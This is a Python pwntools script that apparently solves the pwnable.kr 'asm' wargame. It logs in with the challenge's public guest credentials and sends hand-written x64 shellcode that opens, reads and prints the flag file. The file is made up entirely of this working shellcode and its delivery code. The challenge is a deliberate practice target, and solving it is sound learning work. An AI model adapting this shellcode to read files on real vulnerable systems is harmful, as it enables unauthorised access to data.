from pwn import *

#Setting the global variable to suit the os and the architecture of the running software environement.

context.arch = 'amd64'
context.os = 'linux'
context.bits = 64

#Connect to pwnable server by ssh, then netcat to port 9026 (where the real flag is).

connection = ssh(host="pwnable.kr", port = 2222, user="asm", password="guest")
p = connection.connect_remote("localhost", 9026)

#The shellcode
shellcode = asm("""

    jmp filename
    open:
        xor rdx, rdx
        mov al, 2
        pop rdi
        xor rsi, rsi
        syscall
        mov rdx, rax

    read:
        xor rax, rax
        mov rdi, rdx
        sub rsp, 100
        mov rsi, rsp
        mov rdx, 100
        syscall

    write:
        mov al, 1
        mov rdi, 1
        mov rsi, rsp
        syscall

    exit:
        mov eax, 60
        xor rdi, rdi
        syscall

    filename:
        call open
        .ascii "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
        .byte 0
""")


p.recvuntil("give me your x64 shellcode:")
p.send(shellcode)
p.interactive()

p.close()
